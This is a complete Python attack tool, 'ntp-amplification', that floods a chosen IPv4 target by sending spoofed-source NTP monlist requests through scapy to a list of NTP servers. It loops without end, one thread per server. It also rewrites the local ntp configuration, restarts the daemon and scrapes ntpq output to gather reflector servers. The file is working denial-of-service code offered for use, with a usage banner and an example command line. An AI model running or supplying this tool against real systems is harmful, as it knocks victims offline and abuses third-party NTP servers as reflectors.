#!/usr/bin/env python3

try:
    from scapy.all import IP, UDP, Raw, send
except ImportError:
    raise ImportError(
        "The 'scapy' library is not installed. Please install it using 'apt-get' before using this package."
    )

import json
import socket
import sys
import os
import threading
import subprocess
import time

CONFIG_PATH = "config.json"


class Config:
    def __init__(self, ntp_config_path: str, pools, server_count):
        self.ntp_config_path = ntp_config_path
        self.pools = pools
        self.server_count = server_count

    @classmethod
    def from_json_file(cls, json_file):
        with open(json_file, 'r') as f:
            json_data = f.read()
        return cls.from_json(json_data)

    @classmethod
    def from_json(cls, json_data):
        data = json.loads(json_data)
        ntp_config_path = data['ntp_config_path']
        pools = data['pools']
        server_count = data['server_count']
        config = cls(ntp_config_path, pools, server_count)
        config.removePools()
        config.addPools()
        return config

    def removePools(self):
        with open(self.ntp_config_path, 'r') as config_file:
            lines = config_file.readlines()
        with open(self.ntp_config_path, 'w') as config_file:
            for line in lines:
                if not line.startswith('server'):
                    config_file.write(line)

    def addPools(self):
        with open(self.ntp_config_path, "r") as f:
            content = f.read()
        for pool in self.pools:
            if "server " + pool not in content:
                with open(self.ntp_config_path, "a") as f:
                    f.write("server " + pool + "\n")


class NTPScanner:
    def __init__(self, config: Config):
        self.config = config
        self.restart_daemon()
        self.servers = []

    def restart_daemon(self):
        print("Restarting ntp daemon...")
        subprocess.run(['systemctl', 'restart', 'ntp'])
        print("Synchronizing ntp servers...")
        time.sleep(2 * self.config.server_count)

    def scan(self):
        self.servers.clear()
        print("Scanning for ntp servers...")
        output = subprocess.run(
            ["ntpq", "-p"], capture_output=True).stdout.decode()
        for line in output.split("\n"):
            refid = self.extract_ipv4_refid(line)
            if refid:
                self.servers.append(refid)

    def extract_ipv4_refid(self, row: str):
        fields = row.split(" ")
        if len(fields) < 3:
            return None
        refid = fields[2]
        if not is_ipv4(refid):
            return None
        return refid


def is_ipv4(address: str):
    try:
        socket.inet_pton(socket.AF_INET, address)
    except socket.error:
        return False
    return True


def printHelp():
    banner = """
███╗   ██╗████████╗██████╗        █████╗ ███╗   ███╗██████╗ ██╗     ██╗███████╗██╗███████╗██████╗ 
████╗  ██║╚══██╔══╝██╔══██╗      ██╔══██╗████╗ ████║██╔══██╗██║     ██║██╔════╝██║██╔════╝██╔══██╗
██╔██╗ ██║   ██║   ██████╔╝█████╗███████║██╔████╔██║██████╔╝██║     ██║█████╗  ██║█████╗  ██████╔╝
██║╚██╗██║   ██║   ██╔═══╝ ╚════╝██╔══██║██║╚██╔╝██║██╔═══╝ ██║     ██║██╔══╝  ██║██╔══╝  ██╔══██╗
██║ ╚████║   ██║   ██║           ██║  ██║██║ ╚═╝ ██║██║     ███████╗██║██║     ██║███████╗██║  ██║
╚═╝  ╚═══╝   ╚═╝   ╚═╝           ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                                                                                                                                                                                                                        
"""
    options = """
OPTIONS:\n 
-h, --help: Show this help message and exit
-s, --server: Specify ntp server list\n
"""
    usage = "USAGE: sudo python3 ntp-amplification [Options] <target ip>\n"
    example = "EXAMPLE: sudo python3 ntp-amplification -s exampler-servers.txt 192.168.2.1"
    manual = banner + "\n" + usage + "\n" + example + "\n" + options
    print(manual)


def deny(server: str, target: str):
    payload = "\x17\x00\x03\x2a" + "\x00" * 4
    packet = IP(dst=server, src=target) / \
        UDP(sport=80, dport=123)/Raw(load=payload)
    send(packet, loop=1, verbose=True)


def parse_args():
    if len(sys.argv) < 2:
        printHelp()
        sys.exit(1)

    options = {'-h': "--help", '-s': "--server"}
    args = {"target_ip": None, "server_list": None}

    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg in options.keys():
            if arg == '-h':
                printHelp()
                sys.exit(0)
            if arg == '-s':
                if i + 1 >= len(sys.argv):
                    print("Error: server list file is required")
                    printHelp()
                    sys.exit(1)
                args["server_list"] = sys.argv[i + 1]
        i += 1

    args["target_ip"] = sys.argv[-1]
    if args["target_ip"] is None or not is_ipv4(args["target_ip"]):
        print("Target ip is required and must be a valid ipv4 address")
        printHelp()
        sys.exit(1)

    return args


def read_servers(server_list: str) -> list:
    if not os.path.isfile(server_list):
        print("Error: server list file does not exist")
        sys.exit(1)

    with open(server_list, 'r') as f:
        servers = f.read().splitlines()

    return servers


def ntp_amplify(servers: list, target: str):
    threads = []
    try:
        print("Starting to flood: " + target + " ...")
        print("Use CTRL+Z to stop attack")

        for server in servers:
            thread = threading.Thread(
                target=deny, args=(server, target))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        print("Flooding...")

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("Script interrupted [CTRL + Z]... shutting down")


def main():
    if os.geteuid() != 0:
        print("Script must be executed as root")
        return

    args = parse_args()
    servers = []

    if args["server_list"] is not None:
        servers = read_servers(args["server_list"])
        ntp_amplify(servers, args["target_ip"])
        return

    config = Config.from_json_file(CONFIG_PATH)
    scanner = NTPScanner(config)
    scanner.scan()
    ntp_amplify(scanner.servers, args["target_ip"])


if __name__ == '__main__':
    main()
